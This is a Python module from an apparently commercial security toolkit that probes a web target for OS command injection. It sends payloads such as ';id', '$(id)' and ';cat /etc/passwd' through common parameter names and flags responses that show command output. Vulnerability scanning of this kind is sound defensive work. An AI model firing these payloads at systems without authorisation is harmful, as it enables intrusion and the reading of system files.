# modules/web/command_injection_tester.py
from core.models import ToolResult, Finding, Severity

TOOL_INFO = {
    "name": "command_injection_tester",
    "category": "web",
    "description": "OS command injection vulnerability testing via web parameters",
    "author": "CyberToolkit Pro",
    "version": "1.0.0",
    "args": [
        {"name": "target", "required": True, "description": "Target to analyze"},
    ],
    "tags": ['web', 'command', 'injection', 'rce'],
}


def run(args):

    import urllib.request, urllib.error, urllib.parse, time
    target = args.get("target", "")
    if not target:
        return ToolResult(tool_name="command_injection_tester", status="error", error="No target specified")
    if not target.startswith(("http://", "https://")):
        target = f"http://{target}"
    data = {"target": target, "tests": [], "vulnerabilities": []}
    findings = []
    payloads = [
        (";id", ["uid=", "gid="]),
        ("|id", ["uid=", "gid="]),
        ("$(id)", ["uid=", "gid="]),
        ("`id`", ["uid=", "gid="]),
        (";cat /etc/passwd", ["root:x:0"]),
        ("| type C:\\windows\\system32\\drivers\\etc\\hosts", ["127.0.0.1"]),
    ]
    test_params = ["cmd", "exec", "command", "ping", "query", "host", "ip", "process"]
    for param in test_params[:4]:
        for payload, indicators in payloads[:3]:
            test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=8) as resp:
                    body = resp.read(10000).decode("utf-8", errors="replace")
                    if any(indicator in body for indicator in indicators):
                        data["vulnerabilities"].append({"param": param, "payload": payload, "type": "command_injection"})
                        findings.append(Finding(
                            title=f"Command injection via '{param}'",
                            severity=Severity.CRITICAL,
                            description=f"OS command execution detected through parameter '{param}'",
                            evidence=f"Payload: {payload}",
                            remediation="Never pass user input to OS commands; use parameterized APIs"
                        ))
                        break
            except Exception:
                pass
            data["tests"].append({"param": param, "payload": payload})
    return ToolResult(tool_name="command_injection_tester", target=target, status="success", data=data, findings=findings)

